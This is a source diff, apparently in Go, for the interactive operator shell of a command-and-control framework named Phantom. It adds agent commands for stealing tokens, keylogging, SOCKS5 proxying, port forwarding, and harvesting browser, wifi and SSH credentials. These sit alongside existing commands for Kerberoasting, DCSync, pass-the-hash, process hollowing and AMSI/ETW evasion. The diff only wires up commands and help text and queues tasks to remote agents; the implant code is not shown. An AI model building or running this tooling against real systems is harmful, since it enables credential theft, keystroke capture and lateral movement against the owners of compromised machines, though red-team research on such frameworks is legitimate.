@@ -42,6 +42,7 @@ var agentCommands = []string{
 	"ad-kerberoast", "ad-asreproast", "ad-dcsync",
 	"ad-dump-sam", "ad-dump-lsa", "ad-dump-tickets",
 	"ad-psexec", "ad-wmi", "ad-winrm", "ad-pass-the-hash",
+	"token", "keylog", "socks", "portfwd", "creds",
 }
 
 // Shell is the interactive CLI shell for Phantom.
@@ -411,6 +412,16 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdEvasion()
 	case "pivot":
 		sh.cmdPivot(args)
+	case "token":
+		sh.cmdToken(args)
+	case "keylog":
+		sh.cmdKeylog(args)
+	case "socks":
+		sh.cmdSocks(args)
+	case "portfwd":
+		sh.cmdPortFwd(args)
+	case "creds":
+		sh.cmdCreds(args)
 	default:
 		// Check if it's an AD command
 		if strings.HasPrefix(cmd, "ad-") {
@@ -832,6 +843,11 @@ func (sh *Shell) cmdAgentHelp() {
 		{"hollow <exe> <file>", "Process hollowing (spawn + inject)"},
 		{"evasion", "Re-run evasion (AMSI/ETW/unhook)"},
 		{"pivot <start|stop|list>", "SMB/Unix socket pivot relay"},
+		{"token <steal|make|revert|info>", "Token manipulation (Windows)"},
+		{"keylog [seconds]", "Capture keystrokes (default: 30s)"},
+		{"socks <start|stop> [addr]", "SOCKS5 proxy through agent"},
+		{"portfwd <local> <remote>", "TCP port forwarding"},
+		{"creds <browser|wifi|ssh|all>", "Credential harvesting"},
 		{"ad-*", "Active Directory commands (type 'ad-help')"},
 		{"back", "Return to main menu"},
 	}
@@ -1077,6 +1093,56 @@ func (sh *Shell) cmdPivot(args []string) {
 		return
 	}
 	sh.queueTask(protocol.TaskPivot, args, nil)
+}
+
+func (sh *Shell) cmdToken(args []string) {
+	if len(args) == 0 {
+		Info("Token manipulation commands:")
+		fmt.Printf("    %stoken steal <pid>%s              Steal token from process\n", colorCyan, colorReset)
+		fmt.Printf("    %stoken make <domain> <user> <pass>%s  Create logon token\n", colorCyan, colorReset)
+		fmt.Printf("    %stoken revert%s                   Revert to original token\n", colorCyan, colorReset)
+		fmt.Printf("    %stoken info%s                     Show current token info\n", colorCyan, colorReset)
+		fmt.Printf("    %stoken priv <name>%s              Enable privilege\n", colorCyan, colorReset)
+		return
+	}
+	sh.queueTask(protocol.TaskToken, args, nil)
+}
+
+func (sh *Shell) cmdKeylog(args []string) {
+	duration := "30"
+	if len(args) > 0 {
+		duration = args[0]
+	}
+	Info("Starting keylogger for %ss...", duration)
+	sh.queueTask(protocol.TaskKeylog, []string{duration}, nil)
+}
+
+func (sh *Shell) cmdSocks(args []string) {
+	if len(args) == 0 {
+		Info("SOCKS5 proxy commands:")
+		fmt.Printf("    %ssocks start [bind_addr]%s    Start SOCKS5 (default: 127.0.0.1:1080)\n", colorCyan, colorReset)
+		fmt.Printf("    %ssocks stop%s                 Stop SOCKS5 proxy\n", colorCyan, colorReset)
+		return
+	}
+	sh.queueTask(protocol.TaskSocks, args, nil)
+}
+
+func (sh *Shell) cmdPortFwd(args []string) {
+	if len(args) < 2 {
+		Error("Usage: portfwd <local_addr> <remote_addr>")
+		Info("Example: portfwd 127.0.0.1:8888 10.0.1.5:3389")
+		return
+	}
+	sh.queueTask(protocol.TaskPortFwd, args, nil)
+}
+
+func (sh *Shell) cmdCreds(args []string) {
+	target := "all"
+	if len(args) > 0 {
+		target = args[0]
+	}
+	Info("Harvesting credentials (%s)...", target)
+	sh.queueTask(protocol.TaskCreds, []string{target}, nil)
 }
 
 func (sh *Shell) cmdAD(cmd string, args []string) {
